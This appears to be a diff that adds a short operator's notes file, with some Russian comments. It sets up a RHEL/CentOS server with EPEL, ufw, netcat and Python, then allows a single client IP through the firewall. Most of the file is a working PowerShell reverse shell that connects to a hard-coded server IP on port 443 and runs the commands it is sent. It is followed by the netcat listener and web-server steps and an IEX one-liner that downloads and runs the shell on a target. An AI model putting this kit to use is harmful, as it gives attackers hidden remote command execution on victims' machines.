@@ -1,0 +1,33 @@
+sudo dnf install https://dl.fedoraproject.org/pub/epel/epel-release-latest-8.noarch.rpm
+sudo dnf upgrade
+sudo rpm -ivh https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm
+
+sudo subscription-manager repos --enable "rhel-*-optional-rpms" --enable "rhel-*-extras-rpms"
+sudo yum update
+
+sudo yum install snapd
+
+sudo systemctl enable --now snapd.socket
+sudo ln -s /var/lib/snapd/snap /snap
+sudo snap install ufw
+
+
+yum install epel-release -y
+yum install --enablerepo="epel" ufw -y
+ufw enable
+
+sudo yum install nc
+
+sudo yum -y install @development 
+sudo yum -y install python36
+
+sudo ufw allow from 114.124.15.76 proto tcp to any port 80,443 ###114.124.15.76  IP clienta(узнать можно после запуска shell.ps1
+
+##shell.ps1##
+$client = New-Object System.Net.Sockets.TCPClient("54.144.85.176",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() 
+## - 54.144.85.176 - IP servera
+
+python3 -m http.server 80 &
+sudo nc -lvnp 443
+
+IEX (New-Object Net.WebClient).DownloadString("http://54.144.85.176/shell.ps1");
